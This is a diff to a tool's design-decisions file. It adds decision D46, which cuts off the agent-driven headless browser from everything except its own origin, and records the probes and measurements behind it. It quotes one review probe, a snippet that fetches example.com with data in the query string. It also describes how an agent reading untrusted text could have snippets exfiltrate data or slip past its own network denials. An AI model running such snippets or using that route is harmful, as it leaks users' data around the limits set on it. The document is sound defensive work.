@@ -61,7 +61,8 @@ something new, and the escape hatch to `editor` is what let the ERD get
 right-angle lanes and custom anchors. The trade-off is that a snippet can
 do anything the page can, so the page must never have filesystem or
 network access of its own (layering rule 2 in
-[ARCHITECTURE.md](ARCHITECTURE.md)).
+[ARCHITECTURE.md](ARCHITECTURE.md)). The server enforces the filesystem half
+by mounting no `/api/*` outside serve mode; D46 enforces the network half.
 
 ## D6. MCP entry deferred
 
@@ -746,3 +747,115 @@ table in a different place; the TypeScript type checker, which would resolve
 `TLDefaultColorStyle` into its values but needs the whole `tldraw` type graph
 loaded to write one JSON file.
 
+
+## D46. The page reaches its own origin and nothing else
+
+**Verdict:** every browser the tool launches is cut off from the network
+except the page server's own `http://127.0.0.1:<port>`, by three layers that
+each stand on their own:
+
+1. **Chromium switches** (`isolationArgs` in `src/lib/browser.ts`): a proxy on
+   `127.0.0.1:1` that nothing answers, with `<-loopback>` so other loopback
+   ports go to it too and the page's own `host:port` as the one bypass;
+   `--host-resolver-rules=MAP * ~NOTFOUND , EXCLUDE 127.0.0.1` so no name
+   resolves; and `--webrtc-ip-handling-policy=disable_non_proxied_udp` so
+   WebRTC cannot send UDP around the proxy.
+2. **Request interception** on the browser context (`newIsolatedContext`):
+   `context.route` aborts any request whose URL is off the page's origin,
+   `context.routeWebSocket` closes every WebSocket with 1008, and service
+   workers are blocked.
+3. **A `Content-Security-Policy` header** from the page server
+   (`PAGE_CONTENT_SECURITY_POLICY` in `src/lib/server.ts`): `'self'` plus
+   `data:` and `blob:` where the exports need them, `'unsafe-eval'` for the
+   snippet compiler, and `'none'` for forms, `<base>` and plugins.
+
+`verify`'s harness is the one page served without the header, and it keeps
+the other two.
+
+**Why:** a snippet runs with the page's full power (D5), and the snippet is
+written by an agent. When that agent is reading text it did not write, which
+is what a studio job drawing from a note is, the page's reach is the agent's
+reach. Before this, an independent review of self-learn's studio ran
+`canvas -- run x.tldr --eval "await fetch('https://example.com/?d=...', {mode:'no-cors'})"`
+and got `{"type":"opaque"}` back: the request left the machine. A CORS
+`fetch` is sent too, only the reply is unreadable, and a loopback service that
+answers with `Access-Control-Allow-Origin: *` is readable. So a snippet could
+carry out anything the agent could read, pull a web page into its context,
+and reach services on the machine's own loopback, all around whatever the
+agent's own network tools were denied. Layering rule 2 said the page never
+touches the network; nothing enforced it. The only request bookkeeping was
+`offHostRequests()`, which recorded a request after it had been sent.
+
+Measured with one probe per way out (`fetch` with and without CORS to
+loopback and to example.com, XHR, `new Image`, `sendBeacon`, WebSocket,
+`EventSource`, `<link rel=prefetch>`, an iframe, a CSS font and background, a
+`fetch` from a `blob:` worker, `window.open`, and WebRTC STUN to a loopback
+UDP port) against a listener on another loopback port:
+
+| Build | What the listener heard |
+| --- | --- |
+| before | all twelve loopback HTTP probes, the WebSocket upgrade, and four STUN datagrams; the external `fetch` came back `opaque` |
+| switches only | nothing |
+| interception only | the STUN datagrams |
+| CSP only | the popup's navigation and the STUN datagrams |
+| all three | nothing; every `fetch` rejects with `Failed to fetch` |
+
+DNS has no listener to hear it, so it is read from Chromium's NetLog
+(`--log-net-log`) instead: with no switches, a `fetch` to `leak-<n>.test`
+shows up as a host-resolver job naming that host; with the resolver switch
+alone, or all of them, no resolver event names it. Headless Chrome acted on
+neither `<link rel=dns-prefetch>` nor `preconnect` at all, with or without
+the switches, which is why the probe is a `fetch` rather than a prefetch.
+
+Normal use is unchanged: `run --shot`, `shot`, `export --svg --png` and
+`verify` wrote byte-identical files before and after, `from-mermaid` on the
+eight-node fixture still prints `8 nodes, 9 edges, 1 container, 18 shapes`,
+`doctor` is ready, and the full end-to-end suite, `serve`'s mirror included,
+passes. Each verb took about 0.05 s longer, the cost of the interception.
+
+That round trip exposed a race that was already there: `ping` can answer
+while tldraw's fonts are still loading, and a label measured then is measured
+in a fallback face. On CI the TD and TB imports of the mermaid fixture came
+back 28 units apart; holding the woff2 responses back 1.5 s reproduced the
+same 28 locally. `openCanvasPage` now awaits `document.fonts.ready` before it
+returns, and with the fonts held back 3 s the layout is the normal one.
+
+**Why three layers:** each is the only one somewhere. The switches are the
+floor under everything, including what interception does not see (WebRTC's
+UDP is not a request). Interception is what stops a navigation, a popup or an
+iframe, which CSP cannot refuse, and it still raises the page's `request`
+event, so `offHostRequests()` and `verify`'s `self-contained` check keep
+seeing what was attempted. The header is all serve mode has, because serve
+opens the human's own browser, which this process neither launched nor
+intercepts; no snippet runs there, but a document whose shapes point at a
+remote URL would otherwise be fetched.
+
+**Why the harness has no CSP:** a request CSP refuses never happens, so it
+raises no `request` event, and `self-contained` counts requests. Under the
+header an SVG that links a remote font or image would pass the check it
+exists to fail. Without it the interception still aborts that request, after
+the event has fired, and the check reports it. The canvas does serve the
+header, so `openCanvasPage` also reads Chromium's console line for a CSP
+refusal and adds that URL to `offHostRequests()`, or `doctor` would go blind
+to a `fetch` the header stopped.
+
+**Why these directives:** `'unsafe-eval'` is the price of `exec`, which
+compiles a snippet with the `AsyncFunction` constructor. It widens nothing on
+the network side, because every fetch directive is still `'self'`. There is no
+`'unsafe-inline'` for scripts, since the built `index.html` has none (the
+stand-in page the node-side suite drives moved its script to a file to stay
+under the same policy). `'unsafe-inline'` for styles covers the one inline
+`<style>` in `index.html` and tldraw's own. `data:` and `blob:` are there
+because the PNG export rasterises through a `blob:` URL, the SVG export reads
+each font back to inline it, and a document may carry images as `data:` URLs.
+
+**Two measured traps:** `--force-webrtc-ip-handling-policy`, the name that
+looks right, changed nothing on Chrome for Testing 153; the STUN datagrams
+still arrived. `--webrtc-ip-handling-policy` is the one that works, and a
+unit test pins the name. And `MAP * ~NOTFOUND` matches IP literals as well as
+names, so without the `EXCLUDE` the page itself failed with
+`ERR_NAME_NOT_RESOLVED`.
+
+**Rejected:** deleting `RTCPeerConnection`, `fetch` and friends in an init
+script, which a snippet undoes from a fresh iframe's globals; and CSP alone,
+which leaves navigations and WebRTC open.
